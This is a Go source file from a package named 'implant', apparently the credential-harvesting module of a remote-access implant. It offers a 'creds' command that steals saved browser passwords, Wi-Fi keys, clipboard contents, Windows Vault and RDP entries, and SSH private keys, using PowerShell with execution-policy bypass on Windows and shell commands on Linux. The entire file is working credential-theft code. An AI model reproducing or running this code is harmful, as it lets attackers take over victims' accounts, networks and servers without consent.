package implant

import (
	"fmt"
	"runtime"
	"strings"
)

// CredentialHarvester collects credentials from various sources.

// HarvestCredentials runs all credential harvesting modules.
func HarvestCredentials(target string) ([]byte, error) {
	switch target {
	case "browser", "browsers":
		return harvestBrowserCreds()
	case "wifi":
		return harvestWifiPasswords()
	case "clipboard":
		return harvestClipboard()
	case "vault":
		return harvestWindowsVault()
	case "rdp":
		return harvestRDPCreds()
	case "ssh":
		return harvestSSHKeys()
	case "all":
		return harvestAll()
	default:
		var sb strings.Builder
		sb.WriteString("Credential Harvesting Modules:\n")
		sb.WriteString("  creds browser     Chrome/Firefox/Edge saved passwords\n")
		sb.WriteString("  creds wifi        Saved WiFi passwords\n")
		sb.WriteString("  creds clipboard   Current clipboard contents\n")
		sb.WriteString("  creds vault       Windows Credential Vault\n")
		sb.WriteString("  creds rdp         Saved RDP credentials\n")
		sb.WriteString("  creds ssh         SSH private keys\n")
		sb.WriteString("  creds all         Run all modules\n")
		return []byte(sb.String()), nil
	}
}

func harvestAll() ([]byte, error) {
	var results []string

	modules := []struct {
		name string
		fn   func() ([]byte, error)
	}{
		{"Browser Credentials", harvestBrowserCreds},
		{"WiFi Passwords", harvestWifiPasswords},
		{"Clipboard", harvestClipboard},
		{"SSH Keys", harvestSSHKeys},
	}

	if runtime.GOOS == "windows" {
		modules = append(modules,
			struct {
				name string
				fn   func() ([]byte, error)
			}{"Windows Vault", harvestWindowsVault},
			struct {
				name string
				fn   func() ([]byte, error)
			}{"RDP Credentials", harvestRDPCreds},
		)
	}

	for _, mod := range modules {
		results = append(results, fmt.Sprintf("═══ %s ═══", mod.name))
		output, err := mod.fn()
		if err != nil {
			results = append(results, fmt.Sprintf("  Error: %v", err))
		} else {
			results = append(results, string(output))
		}
		results = append(results, "")
	}

	return []byte(strings.Join(results, "\n")), nil
}

func harvestBrowserCreds() ([]byte, error) {
	if runtime.GOOS == "windows" {
		ps := "$paths = @(" +
			"@{N='Chrome';P=$env:LOCALAPPDATA+'\\Google\\Chrome\\User Data\\Default\\Login Data'}," +
			"@{N='Edge';P=$env:LOCALAPPDATA+'\\Microsoft\\Edge\\User Data\\Default\\Login Data'}" +
			"); foreach($b in $paths){ if(Test-Path $b.P){ Write-Output ('['+$b.N+'] Found: '+$b.P); " +
			"$t=$env:TEMP+'\\ld_copy'; Copy-Item $b.P $t -Force 2>$null; Write-Output ('  Copied to: '+$t)" +
			"} else { Write-Output ('['+$b.N+'] Not found') } }"
		return ExecuteShell([]string{"powershell", "-ep", "bypass", "-c", ps})
	}

	// Linux
	cmd := `echo "=== Chrome ===" && \
find ~/.config/google-chrome -name "Login Data" 2>/dev/null && \
echo "=== Firefox ===" && \
find ~/.mozilla/firefox -name "logins.json" 2>/dev/null && \
for f in $(find ~/.mozilla/firefox -name "logins.json" 2>/dev/null); do echo "--- $f ---"; cat "$f" 2>/dev/null | python3 -m json.tool 2>/dev/null | head -30; done`
	return ExecuteShell([]string{cmd})
}

func harvestWifiPasswords() ([]byte, error) {
	if runtime.GOOS == "windows" {
		ps := "netsh wlan show profiles | Select-String '\\:(.+)$' | ForEach-Object { $p=$_.Matches.Groups[1].Value.Trim(); $k=(netsh wlan show profile name=$p key=clear | Select-String 'Key Content\\W+\\:(.+)$'); if($k){ Write-Output ($p+' : '+$k.Matches.Groups[1].Value.Trim()) } else { Write-Output ($p+' : (no password)') } }"
		return ExecuteShell([]string{"powershell", "-ep", "bypass", "-c", ps})
	}
	return ExecuteShell([]string{`grep -r "psk=" /etc/NetworkManager/system-connections/ 2>/dev/null | sed 's/.*psk=//' || echo "No WiFi passwords found (need root)"`})
}

func harvestClipboard() ([]byte, error) {
	if runtime.GOOS == "windows" {
		return ExecuteShell([]string{"powershell", "-ep", "bypass", "-c", "Get-Clipboard"})
	}
	return ExecuteShell([]string{`xclip -selection clipboard -o 2>/dev/null || xsel --clipboard --output 2>/dev/null || echo "Clipboard tools not available"`})
}

func harvestWindowsVault() ([]byte, error) {
	if runtime.GOOS != "windows" {
		return []byte("Windows Vault: Windows-only feature"), nil
	}
	return ExecuteShell([]string{"cmdkey", "/list"})
}

func harvestRDPCreds() ([]byte, error) {
	if runtime.GOOS != "windows" {
		return []byte("RDP credentials: Windows-only feature"), nil
	}
	ps := `$rdpServers = Get-ChildItem "HKCU:\Software\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue; if ($rdpServers) { foreach ($s in $rdpServers) { $name = $s.PSChildName; $user = $s.GetValue("UsernameHint"); Write-Output "$name : $user" } } else { Write-Output "No saved RDP credentials found" }`
	return ExecuteShell([]string{"powershell", "-ep", "bypass", "-c", ps})
}

func harvestSSHKeys() ([]byte, error) {
	if runtime.GOOS == "windows" {
		return ExecuteShell([]string{"powershell", "-ep", "bypass", "-c", `Get-ChildItem "$env:USERPROFILE\.ssh" -ErrorAction SilentlyContinue | ForEach-Object { Write-Output ("--- " + $_.Name + " ---"); Get-Content $_.FullName -ErrorAction SilentlyContinue | Select-Object -First 5 }`})
	}
	return ExecuteShell([]string{`echo "=== SSH Keys ===" && ls -la ~/.ssh/ 2>/dev/null && echo "" && for f in ~/.ssh/id_*; do echo "--- $f ---"; head -2 "$f" 2>/dev/null; echo "..."; done`})
}
